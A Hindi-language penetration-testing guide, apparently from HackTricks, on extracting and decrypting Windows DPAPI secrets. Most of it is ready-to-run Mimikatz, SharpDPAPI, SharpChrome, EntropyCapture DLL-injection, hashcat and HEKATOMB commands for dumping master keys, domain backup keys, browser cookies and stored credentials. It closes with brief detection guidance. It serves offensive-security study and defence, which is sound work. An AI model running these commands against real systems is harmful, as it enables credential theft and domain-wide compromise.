# DPAPI - पासवर्ड निकालना

{{#include ../../banners/hacktricks-training.md}}

## DPAPI क्या है

डेटा प्रोटेक्शन एपीआई (DPAPI) मुख्य रूप से Windows ऑपरेटिंग सिस्टम के भीतर **असामान्य निजी कुंजियों के सममित एन्क्रिप्शन** के लिए उपयोग किया जाता है, जो उपयोगकर्ता या सिस्टम रहस्यों को महत्वपूर्ण एंट्रॉपी के स्रोत के रूप में उपयोग करता है। यह दृष्टिकोण डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है, जिससे वे उपयोगकर्ता के लॉगिन रहस्यों से निकाली गई कुंजी का उपयोग करके डेटा को एन्क्रिप्ट कर सकते हैं या, सिस्टम एन्क्रिप्शन के लिए, सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग कर सकते हैं, इस प्रकार डेवलपर्स को एन्क्रिप्शन कुंजी की सुरक्षा का प्रबंधन करने की आवश्यकता को समाप्त कर देता है।

DPAPI का उपयोग करने का सबसे सामान्य तरीका **`CryptProtectData` और `CryptUnprotectData`** फ़ंक्शंस के माध्यम से है, जो अनुप्रयोगों को वर्तमान में लॉग इन किए गए प्रक्रिया के सत्र के साथ डेटा को सुरक्षित रूप से एन्क्रिप्ट और डिक्रिप्ट करने की अनुमति देते हैं। इसका मतलब है कि एन्क्रिप्ट किया गया डेटा केवल उसी उपयोगकर्ता या सिस्टम द्वारा डिक्रिप्ट किया जा सकता है जिसने इसे एन्क्रिप्ट किया था।

इसके अलावा, ये फ़ंक्शंस एक **`entropy` पैरामीटर** को भी स्वीकार करते हैं, जिसका उपयोग एन्क्रिप्शन और डिक्रिप्शन के दौरान किया जाएगा, इसलिए, इस पैरामीटर का उपयोग करके एन्क्रिप्ट की गई किसी चीज़ को डिक्रिप्ट करने के लिए, आपको वही एंट्रॉपी मान प्रदान करना होगा जो एन्क्रिप्शन के दौरान उपयोग किया गया था।

### उपयोगकर्ता कुंजी निर्माण

DPAPI प्रत्येक उपयोगकर्ता के लिए उनके क्रेडेंशियल्स के आधार पर एक अद्वितीय कुंजी (जिसे **`pre-key`** कहा जाता है) उत्पन्न करता है। यह कुंजी उपयोगकर्ता के पासवर्ड और अन्य कारकों से निकाली जाती है और एल्गोरिदम उपयोगकर्ता के प्रकार पर निर्भर करता है लेकिन अंततः SHA1 बनता है। उदाहरण के लिए, डोमेन उपयोगकर्ताओं के लिए, **यह उपयोगकर्ता के HTLM हैश पर निर्भर करता है**।

यह विशेष रूप से दिलचस्प है क्योंकि यदि एक हमलावर उपयोगकर्ता के पासवर्ड हैश को प्राप्त कर सकता है, तो वे:

- **DPAPI का उपयोग करके एन्क्रिप्ट किए गए किसी भी डेटा को डिक्रिप्ट कर सकते हैं** उस उपयोगकर्ता की कुंजी के साथ बिना किसी API से संपर्क किए
- **पासवर्ड को क्रैक करने** की कोशिश कर सकते हैं ऑफ़लाइन सही DPAPI कुंजी उत्पन्न करने की कोशिश करते हुए

इसके अलावा, हर बार जब कोई डेटा DPAPI का उपयोग करके एक उपयोगकर्ता द्वारा एन्क्रिप्ट किया जाता है, तो एक नया **मास्टर कुंजी** उत्पन्न होता है। यह मास्टर कुंजी वास्तव में डेटा को एन्क्रिप्ट करने के लिए उपयोग की जाती है। प्रत्येक मास्टर कुंजी को एक **GUID** (ग्लोबली यूनिक आइडेंटिफायर) दिया जाता है जो इसे पहचानता है।

मास्टर कुंजियाँ **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** निर्देशिका में संग्रहीत होती हैं, जहाँ `{SID}` उस उपयोगकर्ता का सुरक्षा पहचानकर्ता है। मास्टर कुंजी उपयोगकर्ता के **`pre-key`** द्वारा एन्क्रिप्ट की गई है और पुनर्प्राप्ति के लिए एक **डोमेन बैकअप कुंजी** द्वारा भी (इसलिए वही कुंजी 2 अलग-अलग पास द्वारा 2 बार एन्क्रिप्ट की गई है)।

ध्यान दें कि **मास्टर कुंजी को एन्क्रिप्ट करने के लिए उपयोग की जाने वाली डोमेन कुंजी डोमेन नियंत्रकों में होती है और कभी नहीं बदलती**, इसलिए यदि एक हमलावर के पास डोमेन नियंत्रक तक पहुंच है, तो वे डोमेन बैकअप कुंजी को पुनर्प्राप्त कर सकते हैं और डोमेन में सभी उपयोगकर्ताओं की मास्टर कुंजियों को डिक्रिप्ट कर सकते हैं।

एन्क्रिप्टेड ब्लॉब में **मास्टर कुंजी का GUID** होता है जो डेटा को एन्क्रिप्ट करने के लिए उपयोग किया गया था, इसके हेडर में।

> [!TIP]
> DPAPI एन्क्रिप्टेड ब्लॉब **`01 00 00 00`** से शुरू होते हैं

मास्टर कुंजियाँ खोजें:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
यह एक उपयोगकर्ता के मास्टर कुंजियों का समूह कैसा दिखेगा:

![](<../../images/image (1121).png>)

### मशीन/सिस्टम कुंजी निर्माण

यह कुंजी मशीन द्वारा डेटा को एन्क्रिप्ट करने के लिए उपयोग की जाती है। यह **DPAPI_SYSTEM LSA रहस्य** पर आधारित है, जो एक विशेष कुंजी है जिसे केवल SYSTEM उपयोगकर्ता ही एक्सेस कर सकता है। इस कुंजी का उपयोग उस डेटा को एन्क्रिप्ट करने के लिए किया जाता है जिसे सिस्टम स्वयं द्वारा एक्सेस किया जाना आवश्यक है, जैसे मशीन-स्तरीय क्रेडेंशियल या सिस्टम-व्यापी रहस्य।

ध्यान दें कि ये कुंजियाँ **डोमेन बैकअप** नहीं रखती हैं इसलिए ये केवल स्थानीय रूप से उपलब्ध हैं:

- **Mimikatz** इसे LSA रहस्यों को डंप करके एक्सेस कर सकता है, कमांड का उपयोग करते हुए: `mimikatz lsadump::secrets`
- रहस्य रजिस्ट्री के अंदर संग्रहीत है, इसलिए एक व्यवस्थापक **इस तक पहुँचने के लिए DACL अनुमतियों को संशोधित कर सकता है**। रजिस्ट्री पथ है: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### DPAPI द्वारा संरक्षित डेटा

DPAPI द्वारा संरक्षित व्यक्तिगत डेटा में शामिल हैं:

- Windows क्रेड्स
- Internet Explorer और Google Chrome के पासवर्ड और ऑटो-कंप्लीशन डेटा
- Outlook और Windows Mail जैसे अनुप्रयोगों के लिए ई-मेल और आंतरिक FTP खाता पासवर्ड
- साझा फ़ोल्डरों, संसाधनों, वायरलेस नेटवर्क और Windows Vault के लिए पासवर्ड, जिसमें एन्क्रिप्शन कुंजियाँ शामिल हैं
- रिमोट डेस्कटॉप कनेक्शनों, .NET पासपोर्ट, और विभिन्न एन्क्रिप्शन और प्रमाणीकरण उद्देश्यों के लिए निजी कुंजियाँ
- क्रेडेंशियल प्रबंधक द्वारा प्रबंधित नेटवर्क पासवर्ड और CryptProtectData का उपयोग करने वाले अनुप्रयोगों में व्यक्तिगत डेटा, जैसे Skype, MSN मैसेंजर, और अधिक
- रजिस्ट्री के अंदर एन्क्रिप्टेड ब्लॉब
- ...

सिस्टम द्वारा संरक्षित डेटा में शामिल हैं:
- Wifi पासवर्ड
- अनुसूचित कार्य पासवर्ड
- ...

### मास्टर कुंजी निष्कर्षण विकल्प

- यदि उपयोगकर्ता के पास डोमेन व्यवस्थापक विशेषाधिकार हैं, तो वे **डोमेन बैकअप कुंजी** तक पहुँच सकते हैं ताकि डोमेन में सभी उपयोगकर्ता मास्टर कुंजियों को डिक्रिप्ट किया जा सके:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- स्थानीय प्रशासनिक विशेषाधिकारों के साथ, यह **LSASS मेमोरी** तक पहुँचने के लिए संभव है ताकि सभी जुड़े उपयोगकर्ताओं के DPAPI मास्टर कुंजी और SYSTEM कुंजी को निकाला जा सके।
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- यदि उपयोगकर्ता के पास स्थानीय प्रशासनिक विशेषताएँ हैं, तो वे मशीन मास्टर कुंजियों को डिक्रिप्ट करने के लिए **DPAPI_SYSTEM LSA रहस्य** तक पहुँच सकते हैं:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- यदि उपयोगकर्ता का पासवर्ड या NTLM हैश ज्ञात है, तो आप **उपयोगकर्ता की मास्टर कुंजियों को सीधे डिक्रिप्ट कर सकते हैं**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- यदि आप एक सत्र के अंदर उपयोगकर्ता के रूप में हैं, तो **RPC का उपयोग करके मास्टर कुंजियों को डिक्रिप्ट करने के लिए DC से बैकअप कुंजी मांगना संभव है**। यदि आप स्थानीय प्रशासक हैं और उपयोगकर्ता लॉग इन है, तो आप इसके लिए **उसका सत्र टोकन चुरा सकते हैं**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## सूची वॉल्ट
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Access DPAPI Encrypted Data

### Find DPAPI Encrypted data

सामान्य उपयोगकर्ताओं के **संरक्षित फ़ाइलें** निम्नलिखित स्थानों पर होती हैं:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- ऊपर दिए गए पथों में `\Roaming\` को `\Local\` में बदलकर भी जांचें।

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) फ़ाइल सिस्टम, रजिस्ट्री और B64 ब्लॉब में DPAPI एन्क्रिप्टेड ब्लॉब्स को खोज सकता है:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
ध्यान दें कि [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (उसी रिपॉजिटरी से) का उपयोग DPAPI का उपयोग करके कुकीज़ जैसी संवेदनशील डेटा को डिक्रिप्ट करने के लिए किया जा सकता है।

### एक्सेस कुंजी और डेटा

- **SharpDPAPI** का उपयोग करें ताकि वर्तमान सत्र से DPAPI एन्क्रिप्टेड फ़ाइलों से क्रेडेंशियल्स प्राप्त किए जा सकें:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **क्रेडेंशियल्स जानकारी प्राप्त करें** जैसे एन्क्रिप्टेड डेटा और guidMasterKey।
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **मास्टरकी तक पहुँचें**:

RPC का उपयोग करके **डोमेन बैकअप कुंजी** का अनुरोध करने वाले उपयोगकर्ता की मास्टरकी को डिक्रिप्ट करें:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** टूल मास्टरकी डिक्रिप्शन के लिए इन तर्कों का भी समर्थन करता है (ध्यान दें कि यह संभव है `/rpc` का उपयोग करके डोमेन का बैकअप कुंजी प्राप्त करना, `/password` का उपयोग करके एक प्लेनटेक्स्ट पासवर्ड का उपयोग करना, या `/pvk` का उपयोग करके एक DPAPI डोमेन प्राइवेट की फ़ाइल निर्दिष्ट करना...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **एक मास्टरकी का उपयोग करके डेटा को डिक्रिप्ट करें**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** टूल `credentials|vaults|rdg|keepass|triage|blob|ps` डिक्रिप्शन के लिए इन तर्कों का भी समर्थन करता है (ध्यान दें कि यह `/rpc` का उपयोग करके डोमेन बैकअप कुंजी प्राप्त करना, `/password` का उपयोग करके एक प्लेनटेक्स्ट पासवर्ड का उपयोग करना, `/pvk` का उपयोग करके एक DPAPI डोमेन प्राइवेट की फ़ाइल निर्दिष्ट करना, `/unprotect` का उपयोग करके वर्तमान उपयोगकर्ताओं के सत्र का उपयोग करना संभव है...)
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- **वर्तमान उपयोगकर्ता सत्र** का उपयोग करके कुछ डेटा को डिक्रिप्ट करें:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### वैकल्पिक एंट्रॉपी ("तीसरे पक्ष की एंट्रॉपी") 

कुछ अनुप्रयोग `CryptProtectData` को एक अतिरिक्त **एंट्रॉपी** मान पास करते हैं। इस मान के बिना, ब्लॉब को डिक्रिप्ट नहीं किया जा सकता, भले ही सही मास्टरकी ज्ञात हो। इस प्रकार से संरक्षित क्रेडेंशियल्स को लक्षित करते समय एंट्रॉपी प्राप्त करना आवश्यक है (जैसे Microsoft Outlook, कुछ VPN क्लाइंट)।

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) एक उपयोगकर्ता-मोड DLL है जो लक्षित प्रक्रिया के भीतर DPAPI कार्यों को हुक करता है और किसी भी वैकल्पिक एंट्रॉपी को पारदर्शी रूप से रिकॉर्ड करता है जो प्रदान की जाती है। `outlook.exe` या `vpnclient.exe` जैसी प्रक्रियाओं के खिलाफ **DLL-injection** मोड में EntropyCapture चलाने से एक फ़ाइल उत्पन्न होगी जो प्रत्येक एंट्रॉपी बफर को कॉल करने वाली प्रक्रिया और ब्लॉब से मैप करती है। कैप्चर की गई एंट्रॉपी को बाद में **SharpDPAPI** (`/entropy:`) या **Mimikatz** (`/entropy:<file>`) को डेटा को डिक्रिप्ट करने के लिए प्रदान किया जा सकता है।
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ने Windows 10 v1607 (2016) से **context 3** masterkey प्रारूप पेश किया। `hashcat` v6.2.6 (दिसंबर 2023) ने हैश-मोड **22100** (DPAPI masterkey v1 context), **22101** (context 1) और **22102** (context 3) जोड़े, जो उपयोगकर्ता पासवर्ड को सीधे masterkey फ़ाइल से GPU-त्वरित क्रैकिंग की अनुमति देते हैं। इसलिए हमलावर शब्द-सूची या ब्रूट-फोर्स हमले कर सकते हैं बिना लक्ष्य प्रणाली के साथ इंटरैक्ट किए।

`DPAPISnoop` (2024) इस प्रक्रिया को स्वचालित करता है:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
यह उपकरण Credential और Vault blobs को भी पार्स कर सकता है, उन्हें क्रैक किए गए कुंजियों के साथ डिक्रिप्ट कर सकता है और स्पष्ट पाठ पासवर्ड को निर्यात कर सकता है।

### अन्य मशीन डेटा तक पहुँचें

**SharpDPAPI और SharpChrome** में आप **`/server:HOST`** विकल्प का संकेत दे सकते हैं ताकि एक दूरस्थ मशीन के डेटा तक पहुँच सकें। बेशक, आपको उस मशीन तक पहुँचने में सक्षम होना चाहिए और निम्नलिखित उदाहरण में यह माना गया है कि **डोमेन बैकअप एन्क्रिप्शन कुंजी ज्ञात है**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## अन्य उपकरण

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक उपकरण है जो LDAP निर्देशिका से सभी उपयोगकर्ताओं और कंप्यूटरों के निष्कर्षण और RPC के माध्यम से डोमेन नियंत्रक बैकअप कुंजी के निष्कर्षण को स्वचालित करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के IP पते को हल करेगी और सभी कंप्यूटरों पर smbclient का प्रदर्शन करेगी ताकि सभी उपयोगकर्ताओं के सभी DPAPI ब्लॉब्स को पुनः प्राप्त किया जा सके और सब कुछ डोमेन बैकअप कुंजी के साथ डिक्रिप्ट किया जा सके।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से निकाले गए कंप्यूटरों की सूची के साथ आप हर उप नेटवर्क को ढूंढ सकते हैं भले ही आप उन्हें नहीं जानते हों!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) स्वचालित रूप से DPAPI द्वारा संरक्षित रहस्यों को डंप कर सकता है। 2.x रिलीज़ में शामिल हैं:

* सैकड़ों होस्ट से ब्लॉब्स का समानांतर संग्रह
* **context 3** मास्टरकीज़ का पार्सिंग और स्वचालित Hashcat क्रैकिंग एकीकरण
* Chrome "App-Bound" एन्क्रिप्टेड कुकीज़ के लिए समर्थन (अगले अनुभाग को देखें)
* एक नया **`--snapshot`** मोड जो बार-बार एंडपॉइंट्स को पोल करता है और नए बनाए गए ब्लॉब्स का अंतर करता है

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) मास्टरकी/क्रेडेंशियल/वॉल्ट फ़ाइलों के लिए एक C# पार्सर है जो Hashcat/JtR प्रारूपों को आउटपुट कर सकता है और वैकल्पिक रूप से स्वचालित रूप से क्रैकिंग को सक्रिय कर सकता है। यह Windows 11 24H1 तक मशीन और उपयोगकर्ता मास्टरकी प्रारूपों का पूर्ण समर्थन करता है।

## सामान्य पहचान

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` और अन्य DPAPI-संबंधित निर्देशिकाओं में फ़ाइलों तक पहुँच।
- विशेष रूप से **C$** या **ADMIN$** जैसे नेटवर्क शेयर से।
- LSASS मेमोरी तक पहुँचने या मास्टरकीज़ को डंप करने के लिए **Mimikatz**, **SharpDPAPI** या समान उपकरणों का उपयोग।
- इवेंट **4662**: *एक वस्तु पर एक ऑपरेशन किया गया था* – इसे **`BCKUPKEY`** वस्तु तक पहुँच के साथ सहसंबंधित किया जा सकता है।
- इवेंट **4673/4674** जब एक प्रक्रिया *SeTrustedCredManAccessPrivilege* (क्रेडेंशियल प्रबंधक) का अनुरोध करती है।

---
### 2023-2025 कमजोरियाँ और पारिस्थितिकी तंत्र में परिवर्तन

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (नवंबर 2023)। एक हमलावर जिसके पास नेटवर्क पहुँच है, एक डोमेन सदस्य को एक दुर्भावनापूर्ण DPAPI बैकअप कुंजी प्राप्त करने के लिए धोखा दे सकता है, जिससे उपयोगकर्ता मास्टरकीज़ का डिक्रिप्शन संभव हो जाता है। नवंबर 2023 के संचयी अपडेट में पैच किया गया – प्रशासकों को सुनिश्चित करना चाहिए कि DCs और कार्यस्थानों को पूरी तरह से पैच किया गया है।
* **Chrome 127 “App-Bound” कुकी एन्क्रिप्शन** (जुलाई 2024) ने विरासती DPAPI-केवल सुरक्षा को एक अतिरिक्त कुंजी के साथ बदल दिया जो उपयोगकर्ता के **क्रेडेंशियल प्रबंधक** के तहत संग्रहीत होती है। कुकीज़ का ऑफ़लाइन डिक्रिप्शन अब DPAPI मास्टरकी और **GCM-लिपटे ऐप-बाउंड कुंजी** दोनों की आवश्यकता होती है। SharpChrome v2.3 और DonPAPI 2.x उपयोगकर्ता संदर्भ के साथ चलने पर अतिरिक्त कुंजी को पुनः प्राप्त करने में सक्षम हैं।

## संदर्भ

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
